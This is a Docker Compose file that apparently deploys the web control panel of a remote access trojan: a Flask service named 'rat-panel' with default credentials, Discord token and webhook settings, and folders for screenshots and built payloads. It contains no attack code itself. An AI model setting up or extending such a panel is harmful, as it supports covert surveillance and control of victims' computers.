version: '3.8'

services:
  web-panel:
    build: .
    container_name: rat-panel
    ports:
      - "5000:5000"
    environment:
      - FLASK_ENV=production
      - PANEL_USER=${PANEL_USER:-astra}
      - PANEL_PASS=${PANEL_PASS:-astra}
      - DISCORD_TOKEN=${DISCORD_TOKEN:-}
      - DISCORD_WEBHOOK=${DISCORD_WEBHOOK:-}
      - DISCORD_CHANNEL=${DISCORD_CHANNEL:-0}
      - PANEL_URL=${PANEL_URL:-http://localhost:5000}
      - WEBHOOK_URL=${WEBHOOK_URL:-}
      - WATCHDOG_URL=${WATCHDOG_URL:-}
      - SECRET_KEY=${SECRET_KEY:-}
    volumes:
      - ./logs:/app/logs
      - ./data:/app/data
      - ./screenshots:/app/screenshots
      - ./dist:/app/dist
    restart: unless-stopped
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:5000/api/ping"]
      interval: 30s
      timeout: 10s
      retries: 3
      start_period: 10s

networks:
  default:
    driver: bridge
